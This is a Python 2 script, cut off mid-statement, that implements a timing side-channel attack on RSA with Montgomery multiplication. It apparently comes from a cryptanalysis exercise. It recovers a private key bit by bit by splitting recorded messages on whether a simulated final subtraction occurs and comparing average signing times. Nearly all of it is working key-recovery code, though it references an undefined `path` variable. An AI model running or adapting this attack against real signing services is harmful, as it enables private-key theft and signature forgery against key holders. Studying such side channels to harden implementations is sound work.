from pprint import pprint
import csv
import math
from random import randint
from multiprocessing import Process, Queue
import sys

def ModInverse(a, n):
	""" Calculates the modular inverse of a mod n.
		http://www.wikiwand.com/en/Extended_Euclidean_algorithm#/Modular_integers
	"""
	(t, new_t, r, new_r) = 0, 1, int(n), int(a)
	while new_r != 0:
		quotient = r//new_r
		(t, new_t) = (new_t, t - quotient * new_t)
		(r, new_r) = (new_r, r - quotient * new_r)
	if r > 1:
		raise ArithmeticError("ERROR: %d is not invertible modulo %d. \n r was: %d, new_r was %d " % (a, n, r, new_r))
	if t < 0:
		t = t + n
	return t

def MongomeryProduct(a, b,n,nprime,r):
	""" Montgomery product."""
	t = a * b
	m = t * nprime % r
	u = (t + m*n)/r
	return (u-n,True) if (u >= n) else (u,False)

def rsa(m, d, n, nPrime, r):
	""" Sign a message using the provided key.
		This is used to detect whether we have guessed the correct key.
		We sign a random message from the data set, and if we end up with a
		signature that matches the corresponding signature in the data set,
		we are done.
	"""
	mm = (m*r)%n
	x_bar = (1*r)%n
	k = len(d)
	sub_count = 0
	for i in range(0, k):
		sub = False
		x_bar, tmp = MongomeryProduct(x_bar,x_bar, n, nPrime, r)
		if d[i]=='1':
			x_bar, sub = MongomeryProduct(mm, x_bar, n, nPrime, r)

		sub_count += int(sub)
	x, tmp = MongomeryProduct(x_bar, 1, n, nPrime, r)
	return x, sub_count


def rsa_sim(m, d, n, nPrime, r, j):
	""" Simulates rsa signing with the current derived key.
		Calculates whether a subtraction was made during step4
		in the final Montgomery multiplication. 
	"""
	mm = (m*r)%n
	x_bar = (1*r)%n
	k = len(d)
	dd = d[:j]
	dd += '1'
	k = len(dd)
	sub = False
	for i in range(0, k):
		x_bar, tmp = MongomeryProduct(x_bar,x_bar, n, nPrime, r)
		#sub = True
		if dd[i]=='1':
			x_bar, sub = MongomeryProduct(mm, x_bar, n, nPrime, r)
			#print sub
	x, tmp = MongomeryProduct(x_bar, 1, n, nPrime, r)
	return x, sub

def do_sim(q_t, q_f, mlist, d, n, nPrime, r, bit):
	t = []
	f = []
	for m in mlist:
		c, bucket = rsa_sim(m[0], d, n, nPrime, r, bit)
		if bucket:
			t.append(m)
		else:
			f.append(m)
	q_t.put(t)
	q_f.put(f)

def split_messages(d, n, nPrime, r, bit,data):
	""" Splits a data set based on the subtraction in montgomery exponentiation."""
	mlist = data
	q_t = Queue()
	q_f = Queue()
	processes = []
	start = 0
	numProcs = 8
	NP = 0
	chunk = len(mlist)//numProcs
	while start < len(mlist):
		p = Process(target=do_sim, args=(q_t, q_f, mlist[start:start+chunk], d, n, nPrime, r, bit))
		NP += 1
		p.start()
		start += chunk
		processes.append(p)
	
	m_true = []
	m_false = []
	for i in range(NP):
		m_true += q_t.get()
		m_false += q_f.get()

	while processes:
		processes.pop().join()
	return (m_true, m_false)

def nPrime(n):
	""" Calculates r^{-1} and n' as used in Montgomery exponentiation"""
	# n is a k-bit number.
	# r should be 2^k
	k = math.floor(math.log(int(n), 2)) + 1
	r = int(math.pow(2, k))
	rInverse = ModInverse(r, n)
	nPrime = (r * rInverse -1) // n
	return (r, nPrime)

def RSAAttack(n,data, ratio):

	""" Attempt to recover the private key from a data set. The public key is konwn, i.e. we know 
		the modulus.
		The data set should contain a list of messages, their signatures, and the time the server took
		to sign that message.
	"""
	(r, n_prime) = nPrime(n)
	# Assume First bit of key is 1
	newkey = '1'
	bit = 1
	finished = False
	while(not finished):
		# Split the data set into two groups, based on subtraction in Montgomery.
		(m_true, m_false) = split_messages(newkey, n, n_prime, r, bit, data)
		# Write the two sets to csv files so they can be plotted or analyzed further
		with open(path+'/'+'%04d'%bit+'.dat', 'w') as f: # 0001.csv 0002.csv etc. One csv for each bit.
			f.write("message,signature,duration,step4\n")
			for el in m_true:
				f.write("%s,1\n" % ','.join(map(str, el)))
			for el in m_false:
				f.write("%s,2\n" % ','.join(map(str, el)))

		# Calculate average signing time for each set
		avg = lambda items: float(sum(items)) / len(items)
		tavg = map(avg, zip(*m_true))[2]
		favg = map(avg, zip(*m_false))[2]

		print "Ratio: \t",tavg/favg, "\tDifference:", abs(tavg-favg)

		# Guess bit based on ratio between the average times
		if abs(tavg-favg) > ratio:
			newkey += '1'
			print "Guessing next bit is 1."
		else:
			newkey += '0'
			print 